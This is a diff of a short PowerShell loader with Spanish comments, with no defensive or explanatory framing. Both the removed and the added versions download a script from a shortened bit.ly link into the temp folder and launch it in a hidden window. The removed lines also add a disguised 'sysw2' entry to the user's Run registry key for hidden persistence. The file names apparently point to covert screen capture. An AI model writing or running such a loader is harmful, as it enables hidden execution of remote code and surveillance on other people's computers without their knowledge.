@@ -1,9 +1,17 @@
-# Descargar y ejecutar el script desde el enlace proporcionado
-$scriptUrl = "https://bit.ly/Screen_dc"
-$scriptPath = "$env:temp\capture_script.ps1"
-Invoke-WebRequest -Uri $scriptUrl -OutFile $scriptPath
-Start-Process powershell.exe -WindowStyle Hidden -ArgumentList "-File $scriptPath"
+function DescargarYEjecutarScript {
+    param (
+        [string]$scriptUrl
+    )
 
-# Agregar entrada al registro de usuario actual para iniciar con el sistema de forma oculta
-$regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
-Set-ItemProperty -Path $regPath -Name "sysw2" -Value "powershell.exe -WindowStyle Hidden -File $scriptPath"
+    if (-not $scriptUrl) {
+        Write-Host "Debe proporcionar la URL del script a descargar." -ForegroundColor Red
+        exit
+    }
+
+    $scriptPath = "$env:temp\capture_script.ps1"
+    Invoke-WebRequest -Uri $scriptUrl -OutFile $scriptPath
+    Start-Process powershell.exe -WindowStyle Hidden -ArgumentList "-File $scriptPath"
+}
+
+# Llamada a la función para descargar y ejecutar el script
+DescargarYEjecutarScript -scriptUrl "https://bit.ly/Screen_dc"
